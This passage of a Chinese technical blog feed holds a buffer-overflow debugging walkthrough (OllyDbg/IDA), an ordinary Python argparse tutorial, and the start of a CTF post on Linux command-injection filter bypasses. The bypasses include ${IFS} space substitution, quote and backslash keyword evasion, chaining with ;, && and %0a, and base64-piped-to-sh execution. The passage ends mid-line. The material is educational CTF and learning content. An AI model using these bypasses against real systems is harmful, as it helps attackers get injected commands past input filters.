-&gt;    选择运行中的程序</li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220212336225.png" alt="image-20191220212336225"></p><p> 因为我们需要从main函数开始分析，而上图：004015B0地址为软件初始运行地址，并非main函数的起始地址。所以我们需要寻找main函数的内存地址。我们使用 IDA Pro 打开程序寻找，当然我们可以不断地按F8单步执行，通过观察获取，但是这样未免需要一定的经验，而且也比较麻烦。所以我们将程序拖入IDA中</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220213005763.png" alt="image-20191220213005763"></p><p>如果不是图上的情况，而是图下的情况，按一下空格键，即可调出图上内容</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220212914884.png" alt="image-20191220212914884"></p><p>双击进入如下页面：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220213151974.png"></p><p>按下空格键</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220213345908.png" alt="image-20191220213345908.png"></p><p>可见,IDA已经帮我们获取了main函数的入口地址，即<code>0x00401010  </code>,此时，我们可以切换到OD中，<code>Ctrl + G</code> 输入<code>401010</code>跳到该位置，按F2设置一个断点( 某个内存地址下了F2断点,当程序运行到此处的时候就会断下来 )</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214324018.png" alt="image-20191220214324018"></p><p>由上面的截图，我们除了可以知道main函数的位置外，我们还从下面那段话“跳转来自 00401005”（英文版的是：jump from 00401005）得知main函数是由位于0x00401005位置处的语句跳过来的。由于缓冲区溢出是与栈空间紧密相关的，所以我们现在应当分析调用（CALL）main函数前后，栈空间的情况，所以这里我们就需要定位究竟是哪条语句调用了main函数。如果仅仅通过OD，我们是比较难定位的，所以这里我还是使用IDA Pro。</p><p>由于已经知道main函数的地址是0x00401010，那么我们在IDA中，用鼠标在该地址点一下，之后利用快捷键“Ctrl+X”打开“交叉引用窗口”，就来到了jmp到此的函数位置：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214521642.png" alt="image-20191220214521642"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214544784.png" alt="image-20191220214544784"></p><p>然后在0x00401005的地址处，再次利用“交叉引用”功能，我们就能够找到调用main函数的位置了：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214634601.png" alt="image-20191220214634601"></p><p>位于 <code>0x00401694</code>处的语句调用了main函数，那么接下来我们在OD中来分析堆栈的情况</p><p>继续<code>Ctrl + G</code> 输入 401694 跳转到执行main函数的内存地址，F2设置断点</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220215539618.png" alt="image-20191220215539618"></p><p>注意上图中 红色箭头和黄色箭头的地方</p><p>​        红色箭头 CALL语句下面的地址是0x00401699。这个地址很重要，为什么重要呢？因为我们的程序在进入每一个CALL之前，都会首先将CALL<strong>下面那条语句的地址入栈</strong>，然后<strong>再执行CALL语句</strong>。这样当CALL执行完后，程序再将该地址出栈，这样就能够知道下一步应该执行哪条指令. 我们一般也将这个地址称为“返回地址”，它告诉程序：“CALL执行完后，请执行这个地址处的语句。”  </p><p>我们按下F9，跳转到此位置，查看栈中内容：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220215928730.png" alt="image-20191220215928730"></p><p>我们接下来按F7，进入这个CALL,此时再看一下栈空间(注：栈空间由下至上是高地址往低地址处走的  )</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220220111419.png" alt="image-20191220220111419"></p><p>是上上图CALL语句下一个内存地址哦，由此可见，返回地址0x00401669已经入栈 .</p><h2 id="分析main函数的缓冲区情况"><a href="#分析main函数的缓冲区情况" class="headerlink" title="分析main函数的缓冲区情况"></a>分析main函数的缓冲区情况</h2><p>  因为我们在源程序中创建了一个8个字节大小的数组，因此进入main函数后的首要工作就是为这个局部变量分配空间。由于我们的程序是以Debug形式编译的，所以它会多分配一些空间（Release版本则会分配正好的空间）。结合本程序可以看到，它为我们分配的局部变量空间大小为0x4C(7C - 34)-&gt;（F8一步步向下执行）：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220220929691.png" alt="image-20191220220929691"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220221935424.png" alt="image-20191220221935424"></p><p>  在上图中，比较重要的是最后两行。其中最后一行在之前已经说过了，是非常重要的<strong>返回地址</strong>，它决定了当main函数执行完毕后，程序所要执行的语句的地址，而倒数第二行是父函数的EBP 。</p><p>  再往上，就是我们的main函数的局部变量空间。这里大家可能会有疑惑，既然是分配给我们的空间，那么为什么还会有其它的数据呢？  我们继续往下执行 ,当我们执行完<code>0x401026</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222344195.png" alt="image-20191220222344195"><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222551168.png" alt="image-20191220222551168"></p><p>0X4C的空间大小(7C - 34), 这段空间都被0xCC填充了。这是因为程序为了容错性与保持自身的健壮性，于是利用0xCC，即int 3断点来填充满这段区域，这样一来，如果有未知的程序跳到这片区域，就不会出现崩溃的情况，而是直接断下来了。当然，这个问题与我们的缓冲区溢出没什么关系。</p><p>继续执行：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222811127.png" alt="image-20191220222811127"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222849625.png" alt="image-20191220222849625"></p><p>这里将<code>betao</code>入栈了，说明执行到了strcpy()，这个函数，我们通过IDA来查看一下，strcpy()函数的位置</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223306866.png" alt="image-20191220223306866"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223344255.png" alt="image-20191220223344255"></p><p>继续执行，查看堆栈中的情况</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223433751.png" alt="image-20191220223433751"></p><p>发现<code>strcpy</code>函数的第二个参数，也就是接收字符串所保存的位置，其保存的位置为<code>0X0012FF78</code>(buffer变量)</p><p>到这里程序无异常，正常执行，继续F8，直至retn</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223754120.png" alt="image-20191220223754120"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220223820151.png" alt="image-20191220223820151"></p><p>这个地址是不是很熟悉呢？没错就是返回地址</p><h2 id="对溢出程序分析"><a href="#对溢出程序分析" class="headerlink" title="对溢出程序分析"></a>对溢出程序分析</h2><p>其余跟上面步骤类似，我们直接跳至执行<code>strcpy</code>函数的内存地址分析</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224251689.png" alt="image-20191220224251689"></p><p>继续执行，执行至retn,查看堆栈此时的情况:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224431503.png" alt="image-20191220224431503"></p><p>我们右键显示一下ascii码：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224531935.png" alt="image-20191220224531935"></p><p>由上图可知： 原本返回值：<code>0x00401699</code>地址被占用 且指向错误的地址（或不应该的地址）</p><p>F8执行，结果如图</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220224744720.png" alt="image-20191220224744720"> </p><p>此时我们发现了两件事，一件是OD中的反汇编代码窗口是空的，说明<code>0x006F6174</code>地址处不存在指令，或者说它就是一个无效地址。第二件事是OD弹出了错误对话框，提示我们该地址出错，这与我们直接执行程序时所弹出的错误对话框有几分类似。</p><p>这里先补充一下，为什么返回地址显示的是<code>tao</code>,而不是<code>aob</code>，因为buffer 空间只有8个字节，而我输入了15个字节，buffer后面的四个字节是ebp的地址.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">betaobetaobetao</span><br><span class="line">拷贝字符  EBP     覆盖内容</span><br></pre></td></tr></table></figure><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>我们也可以通过执行<code>test2.exe</code>程序</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220230136615.png" alt="image-20191220230136615"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220230205983.png" alt="image-20191220230205983"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220230259576.png" alt="image-20191220230259576"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>缓冲区漏洞的原理，它就是因为我们输入了过长的字符，而缓冲区本身又没有有效的验证机制，导致过长的字符将返回地址覆盖掉了，当我们的函数需要返回的时候，由于此时的返回地址是一个无效地址，因此导致程序出错。</p><p>那么依据这个原理，假设我们所覆盖的返回地址是一个有效地址，而在该地址处又包含着有效的指令，那么我们的系统就会毫不犹豫地跳到该地址处去执行指令。因此，如果想利用缓冲区溢出的漏洞，我们就可以构造出一个有效地址出来，然后将我们想让计算机执行的代码写入该地址，这样一来，我们就通过程序的漏洞，让计算机执行了我们自己编写的程序。</p><blockquote><p>本文例子参考来源：  <a href="https://blog.csdn.net/ioio_jy/article/details/48316029">https://blog.csdn.net/ioio_jy/article/details/48316029</a> </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 什么是缓冲区溢出？？？先作下类比，如果某个人把一瓶啤酒全部倒入一个小杯子中，那装不下的啤酒就会四处冒出，流到桌子上。&lt;/p&gt;
&lt;p&gt;  同样的道理，在计算机内部，输入数据通常被存放在一个临时空间内，这个临时存放空间就被称为缓冲区，缓冲区的长度事先已经被程序或者操作系统定义</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="溢出攻击" scheme="http://www.ywboy.cn/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Python3--argparse模块简要使用</title>
    <link href="http://www.ywboy.cn/2020/10/04/Python3-argparse%E6%A8%A1%E5%9D%97%E7%AE%80%E8%A6%81%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.ywboy.cn/2020/10/04/Python3-argparse%E6%A8%A1%E5%9D%97%E7%AE%80%E8%A6%81%E4%BD%BF%E7%94%A8/</id>
    <published>2020-10-04T01:27:05.000Z</published>
    <updated>2020-10-04T01:27:40.819Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Python3中的argparse模块，是用来做<strong>命令行参数解析的</strong>，因为optparse模块已经不再更新，所以特此来为argparse的使用做个笔记</p><p>官网是这样说明的：</p><p> <em>3.2版后已可移除：</em>该<a href="https://docs.python.org/zh-cn/3.7/library/optparse.html#module-optparse"><code>optparse</code></a>模块已弃用，将不再进行开发；该<a href="https://docs.python.org/zh-cn/3.7/library/argparse.html#module-argparse"><code>argparse</code></a>模块将继续开发 </p><p>optparse官方说明地址： <a href="https://docs.python.org/zh-cn/3.7/library/optparse.html">https://docs.python.org/zh-cn/3.7/library/optparse.html</a> </p><p>这个模块的基本使用步骤跟optparse差别不大，使用步骤如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import argparse # 导入模块</span><br><span class="line"></span><br><span class="line">parser &#x3D; argparse.ArgumentParser()  # 创建一个解析对象</span><br><span class="line">parser.add_argument() # 添加参数</span><br><span class="line">parser.parse_args() # 解析</span><br></pre></td></tr></table></figure><p>**argparse.ArgumentParse()**方法有很多参数，但是最常用的就是description,</p><ul><li><p>prog = None         # 程序名，默认为sys.argv[0]。另外，如果你需要在help中使用到程序的名字，可以使用%(prog)s </p></li><li><p>description = None   # help时显示的开始文字</p></li><li><p>epilog = None   # help时显示的结尾文字</p></li><li><p>prefix_chars=’-‘,   - 命令的前缀，默认是‘-’ </p></li><li><p>add_help=True  # 是否增加-h/–help选项，默认是True) </p></li><li><p>usage：# 描述程序用途的字符串 </p></li><li><p>….. </p></li></ul><p>更详细的使用，查看官方文档： <a href="https://docs.python.org/zh-cn/3.7/library/argparse.html">https://docs.python.org/zh-cn/3.7/library/argparse.html</a> </p><p><strong>add_argument()</strong> 方法和参数，我们实际使用来介绍:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># file-name:print_name.py</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Dome of argparse &#39;)</span><br><span class="line">    parser.add_argument(&#39;--name&#39;, &#39;-n&#39;, default&#x3D;&#39;Tao&#39;)</span><br><span class="line"></span><br><span class="line">    return parser</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    parser &#x3D; main()</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line">    name &#x3D; args.name</span><br><span class="line">    print(&#39;Hello &#123;0&#125;&#39;.format(name))</span><br></pre></td></tr></table></figure><p>上述代码执行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py --name dog</span><br><span class="line"><span class="comment"># 输出：Hello dog</span></span><br></pre></td></tr></table></figure><p>上面的代码中，我们首先导入了<code>argparse</code>模块，然后通过 <code>argparser.ArgumentParser</code>函数生成argparser对象 ，其中这个函数的<code>description</code>字段，表示在命令行显示的帮助信息时输出这个程序的描述信息，然后我们通过<code>add_argument</code>函数来增加参数，这里我添加了两个参数<code>-n</code>和<code>--name</code>，其中有个默认值字段<code>default</code>是Tao。然后我们这里发现，同一个值的设定可以设置多个参数。</p><p>这里默认值的意思是，如果我们不传这个参数，那么这个参数的值默认就是<code>Tao</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py</span><br><span class="line"><span class="comment"># 输出：Hello Tao</span></span><br></pre></td></tr></table></figure><p> 最后我们通过argpaser对象的<code>parser_args</code>函数来获取所有参数<code>args</code>，然后通过<code>args.name</code>的方式得到我们设置的<code>-name</code>参数的值，可以看到这里argparse默认的参数名就是<code>--name</code>形式里面<code>--</code>后面的字符串 。</p><p>一 .</p><ul><li><code>default</code> ：没有设置值情况下的默认参数</li></ul><p>二 .</p><ul><li><code>required</code> ：表示这个参数是否一定需要设置</li></ul><p>如果设置了<code>required=True</code>,然则在实际的运用中不设置该参数，那么则会报错，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py</span><br></pre></td></tr></table></figure><p>输出如下信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage: print_name.py [-h] --name NAME</span><br><span class="line">print_name.py: error: the following arguments are required: --name</span><br></pre></td></tr></table></figure><ul><li><code>type</code>  指定参数类型，默认是str, 还有int,float等</li></ul><p>如果你的程序需要整数运算的话，那么需要指定<code>type=int</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Dome of argparse &#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--num&#x27;</span>, type=int)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = main()</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    sum = args.num</span><br><span class="line">    print(<span class="number">1</span>+sum)</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python print_num.py --num <span class="number">10</span></span><br><span class="line"><span class="comment"># 输出：11</span></span><br></pre></td></tr></table></figure><p>没有指定的话，则会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python print_num.py --num <span class="number">10</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;print_num.py&quot;</span>, line <span class="number">13</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(<span class="number">1</span>+sum)</span><br><span class="line">TypeError: unsupported operand type(s) <span class="keyword">for</span> +: <span class="string">&#x27;int&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>dest</code>  设置参数在代码中的变量名</p><ul><li>argparse默认的变量名是<code>--</code>或<code>-</code>后面的字符串，但是你也可以通过<code>dest=xxx</code>来设置参数的变量名，然后在代码中用<code>args.xxx</code>来获取参数的值 </li></ul></li><li><p><code>choices</code>  参数值只能从几个选项里面选择</p></li><li><p><code>help</code>   指定参数的说明信息</p><ul><li>告诉别人这个参数有啥作用</li></ul></li></ul><p>通过代码来解释一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choices</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Choices Dome&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, dest=<span class="string">&#x27;choice&#x27;</span>, required=<span class="literal">True</span>, choices=[<span class="string">&#x27;Tao&#x27;</span>,<span class="string">&#x27;xiaoming&#x27;</span>], help=<span class="string">&#x27;Choose a person you love&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = choices()</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    choice = args.choice</span><br><span class="line">    print(<span class="string">&#x27;You choices is &#123;0&#125;&#x27;</span>.format(choice))</span><br><span class="line">i</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>帮助信息的输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python print_choices.py -h</span><br><span class="line"></span><br><span class="line">usage: print_choices.py [-h] -c &#123;Tao,xiaoming&#125;</span><br><span class="line"></span><br><span class="line">Choices Dome</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help         show this help message <span class="keyword">and</span> exit</span><br><span class="line">  -c &#123;Tao,xiaoming&#125;  Choose a person you love  <span class="comment"># 在这里！！！</span></span><br></pre></td></tr></table></figure><p>选择一个参数，结果执行如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_choices.py -c Tao</span><br><span class="line"><span class="comment"># 输出结果： You choices is Tao</span></span><br></pre></td></tr></table></figure><ul><li><code>nargs</code>   命令行参数的个数，指定这个参数后面的value有多少个，默认为1.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">值含义</span><br><span class="line">N  参数的绝对个数（例如：<span class="number">3</span>）</span><br><span class="line"><span class="string">&#x27;?&#x27;</span>   <span class="number">0</span>或<span class="number">1</span>个参数</span><br><span class="line"><span class="string">&#x27;*&#x27;</span>   <span class="number">0</span>或所有参数</span><br><span class="line"><span class="string">&#x27;+&#x27;</span>   所有，并且至少一个参数</span><br></pre></td></tr></table></figure><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parser</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;nargs Dome&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, dest=<span class="string">&#x27;name&#x27;</span> ,required=<span class="literal">True</span>, type=str, nargs=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = get_parser()</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    names = <span class="string">&#x27;, &#x27;</span>.join(args.name)</span><br><span class="line">    print(<span class="string">&#x27;Hello %s&#x27;</span> % names)</span><br></pre></td></tr></table></figure><p>使用如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python print_name.py -n Tao xiaoming</span><br><span class="line">Hello Tao, xiaoming</span><br></pre></td></tr></table></figure><p>关于add_argument详细参数使用如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ArgumentParser.add_argument(name <span class="keyword">or</span> flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</span><br><span class="line">定义应该如何解析一个命令行参数。下面每个参数有它们自己详细的描述，简单地讲它们是：</span><br><span class="line"></span><br><span class="line">name <span class="keyword">or</span> flags - 选项字符串的名字或者列表，例如foo 或者-f, --foo。</span><br><span class="line">action - 在命令行遇到该参数时采取的基本动作类型。</span><br><span class="line">nargs - 应该读取的命令行参数数目。</span><br><span class="line">const - 某些action和nargs选项要求的常数值。</span><br><span class="line">default - 如果命令行中没有出现该参数时的默认值。</span><br><span class="line">type - 命令行参数应该被转换成的类型。</span><br><span class="line">choices - 参数可允许的值的一个容器。</span><br><span class="line">required - 该命令行选项是否可以省略（只针对可选参数）。</span><br><span class="line">help - 参数的简短描述。</span><br><span class="line">metavar - 参数在帮助信息中的名字。</span><br><span class="line">dest - 给parse_args()返回的对象要添加的属性名称。</span><br></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><ul><li><p><a href="https://www.cnblogs.com/piperck/p/8446580.html">https://www.cnblogs.com/piperck/p/8446580.html</a> </p></li><li><p><a href="http://vra.github.io/2017/12/02/argparse-usage/">http://vra.github.io/2017/12/02/argparse-usage/</a> </p></li><li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html">https://docs.python.org/zh-cn/3.7/library/argparse.html</a> </p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Python3中的argparse模块，是用来做&lt;strong&gt;命令行参数解析的&lt;/strong&gt;，因为optparse模块已经不再更新，所</summary>
      
    
    
    
    <category term="Python" scheme="http://www.ywboy.cn/categories/Python/"/>
    
    
    <category term="Python常用模块" scheme="http://www.ywboy.cn/tags/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>Linux在CTF中的一些小技巧</title>
    <link href="http://www.ywboy.cn/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://www.ywboy.cn/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2020-10-04T01:24:32.000Z</published>
    <updated>2020-10-28T07:28:08.877Z</updated>
    
    <content type="html"><![CDATA[<p>CTF中各种花里胡哨的操作还是挺多的，这里参考大佬的文章，做了更详细的总结！</p><h2 id="场景一：限制空格"><a href="#场景一：限制空格" class="headerlink" title="场景一：限制空格"></a>场景一：限制空格</h2><p> 假如需要实现 <strong>cat flag.txt</strong> 命令读取flag： </p><ol><li>利用&lt;&gt;重定向符：</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085145611.png" alt="image-20191203085145611"></p><ol start="2"><li>利用${IFS}变量(内部域分隔符)：</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085327815.png" alt="image-20191203085327815"></p><ol start="3"><li>利用{,}来代替：</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085410858.png" alt="image-20191203085410858"></p><ol start="4"><li>利用$IFS$9:</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085455982.png" alt="image-20191203085455982"></p><h2 id="场景二：不允许指定命令执行"><a href="#场景二：不允许指定命令执行" class="headerlink" title="场景二：不允许指定命令执行"></a>场景二：不允许指定命令执行</h2><p> 假如需要执行 <strong>uname</strong> 命令，但过滤掉了 uname 字符： </p><ol><li>利用参数拼接（黑名单绕过）：</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085620660.png" alt="image-20191203085620660"></p><ol start="2"><li><p>利用’ “  单、双引号（碰到 escapeshellcmd() 时有效bypass）： </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085659619.png" alt="image-20191203085659619"></p></li></ol><p>单、双引号成对出现不过滤，表示空字符串；</p><ol start="3"><li>利用 <strong>`</strong> 小引号，就是Tab上那个引号：</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085835665.png" alt="image-20191203085835665"></p><p>如果一串命令中存在``，会先执行引号内的命令；</p><p>这也就是利用DNS传数据的利用点；</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085954623.png" alt="image-20191203085954623"></p><ol start="4"><li>利用转义符号\反斜杠来绕过</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090216583.png" alt="image-20191203090216583"></p><h2 id="场景三：一次执行多条命令"><a href="#场景三：一次执行多条命令" class="headerlink" title="场景三：一次执行多条命令"></a>场景三：一次执行多条命令</h2><p>假如需要执行uname和id命令：</p><ol><li><p>利用shell脚本结束符; 分号：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090345359.png" alt="image-20191203090345359"></p></li><li><p>利用逻辑符号(&amp;,&amp;&amp;,|,||)</p></li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090538453.png" alt="image-20191203090538453"></p><ol start="2"><li>在Web页面执行时可以利用回车的url编码 <strong>%0a</strong> 来绕过 </li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090709704.png" alt="image-20191203090709704"></p><p>类似在shell脚本下放了两条命令</p><h2 id="命令编码绕过"><a href="#命令编码绕过" class="headerlink" title="命令编码绕过"></a>命令编码绕过</h2><p><strong>base64</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;whoami&quot; | base64</span></span><br><span class="line">d2hvYW1p</span><br><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;d2hvYW1p&quot; | base64 -d | sh</span></span><br><span 